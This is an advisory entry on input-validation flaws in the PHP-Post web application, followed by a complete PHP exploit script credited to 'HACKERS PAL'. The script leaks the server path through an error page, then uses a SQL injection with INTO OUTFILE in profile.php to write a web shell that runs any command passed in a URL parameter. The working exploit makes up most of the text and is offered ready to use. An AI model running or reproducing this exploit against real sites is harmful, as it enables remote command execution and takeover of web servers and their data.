source: http://www.securityfocus.com/bid/20061/info

PHP-Post is prone to multiple input-validation vulnerabilities, including multiple cross-site scripting, SQL-injection, and remote file-include issues, because the application fails to sanitize user-supplied input. 

A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, exploit vulnerabilities in the underlying database implementation, or include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. Other attacks are also possible.

#!/usr/bin/php -q -d short_open_tag=on
<?
/*
/* PhP-post Sql injection Remote Command execution Exploit
/*                 By : HACKERS PAL
/*                   WwW.SoQoR.NeT
*/
print_r('
/***********************************************/
/* PHP-post remote sql injection make phpshell */
/*   by HACKERS PAL <security@soqor.net>       */
/*       site: http://www.soqor.net            */');
if ($argc<2) {
print_r('
/* --                                          */
[-] Usage: php '.$argv[0].' host
[-] Example:
[-] php '.$argv[0].' http://localhost/phpp
/***********************************************/
');
die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

$url=$argv[1];
$exploit1="/footer.php?template=11hack11";

         Function get_page($url)
         {

                  if(function_exists("file_get_contents"))
                  {

                       $contents = file_get_contents($url);

                          }
                          else
                          {
                              $fp=fopen("$url","r");
                              while($line=fread($fp,1024))
                              {
                               $contents=$contents.$line;
                              }


                                  }
                       return $contents;
         }

     $page = get_page($url.$exploit1);

             $pa=explode("<b>",$page);
             $pa=explode("</b>",$pa[2]);
             $path = str_replace("footer.php","",$pa[0])."soqor.php";
             $var='\ ';
             $var  = str_replace(" ","",$var);
             $path = str_replace($var,"/",$path);
             $exploit2="/profile.php?user='%20union%20select%201,'<?php%20','system(','".'$_GET[cmd]'."',');','die();','?>',8,9,10,11,12,13,14,15,16,17,1
8,19,20,21%20INTO%20OUTFILE%20'$path'%20from%20phpp_users/*";
     $page_now = get_page($url.$exploit2);
     Echo "\n[+] Go TO $url/soqor.php?cmd=id\n[+] Change id to any command you want :)";
     Die("\n/* Visit us : WwW.SoQoR.NeT                    */\n/***********************************************/");

?>
